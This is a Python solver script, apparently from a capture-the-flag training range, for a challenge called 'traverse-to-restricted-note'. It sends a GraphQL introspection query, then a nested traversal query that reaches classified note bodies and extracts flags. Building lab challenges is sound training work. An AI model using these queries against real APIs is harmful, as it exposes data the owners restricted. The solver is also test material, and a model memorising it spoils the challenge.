"""Intended-path solver: introspection then traversal to the restricted note."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

INTROSPECTION_QUERY = (
    "{__schema{queryType{name} types{name kind fields{name type{name kind ofType{name kind}}}}}}"
)
TRAVERSAL_QUERY = "{users{id team{project{id notes{id classification body}}}}}"


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    detail = "no attempts completed"
    captured = None
    intro_ok = False
    for attempt in range(4):
        try:
            intro = httpx.post(f"{base}/graphql", json={"query": INTROSPECTION_QUERY}, timeout=10)
            schema_text = intro.text
            intro_ok = '"Note"' in schema_text and '"body"' in schema_text
            walk = httpx.post(f"{base}/graphql", json={"query": TRAVERSAL_QUERY}, timeout=10)
            flags = find_flags(walk.text)
        except Exception as exc:  # retry any transport hiccup
            detail = f"attempt {attempt}: {type(exc).__name__}"
            continue
        detail = (
            f"attempt {attempt}: intro={'ok' if intro_ok else 'incomplete'}, flags={len(flags)}"
        )
        if flags and intro_ok:
            captured = flags[0]
            break
    ok = bool(captured and intro_ok)
    return SolveResult(
        results=[
            TaskResult(
                task_id="traverse-to-restricted-note",
                ok=ok,
                captured=captured,
                detail=None if ok else detail,
            )
        ]
    )
